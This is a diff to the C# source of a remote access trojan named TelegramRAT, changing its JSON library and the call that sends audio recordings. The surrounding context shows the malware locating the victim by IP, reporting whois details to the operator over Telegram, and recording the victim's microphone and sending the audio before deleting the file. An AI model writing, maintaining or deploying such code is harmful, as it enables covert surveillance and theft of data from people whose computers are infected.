@@ -1,17 +1,14 @@
 ﻿using System;
 using System.IO;
-using System.Text;
-using System.Linq;
 using System.Net;
 using System.Drawing;
 using System.Threading;
 using System.Diagnostics;
 using System.Collections.Generic;
-using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Speech.Synthesis;
 using System.Windows.Forms;
-using Newtonsoft.Json.Linq;
+using SimpleJSON;
 
 namespace TelegramRAT
 {
@@ -211,7 +208,7 @@ namespace TelegramRAT
                         WebClient client = new WebClient();
                         string response = client.DownloadString(url);
                         // Parse json
-                        dynamic json = JObject.Parse(response);
+                        dynamic json = JSON.Parse(response);
                         if (json.result == 200)
                         {
                             float lat = json.data.lat;
@@ -247,7 +244,7 @@ namespace TelegramRAT
                         WebClient client = new WebClient();
                         string response = client.DownloadString(url);
                         // Parse json
-                        dynamic json = JObject.Parse(response);
+                        dynamic json = JSON.Parse(response);
                         telegram.sendText(
                             "\n📡 Whois:" +
                             "\nIP: " + json.query +
@@ -384,7 +381,7 @@ namespace TelegramRAT
                             break;
                         }
                         // Send
-                        telegram.sendVoice(filename, Int32.Parse(time));
+                        telegram.sendVoice(filename);
                         // Delete recording (костыль)
                         while (true)
                         {
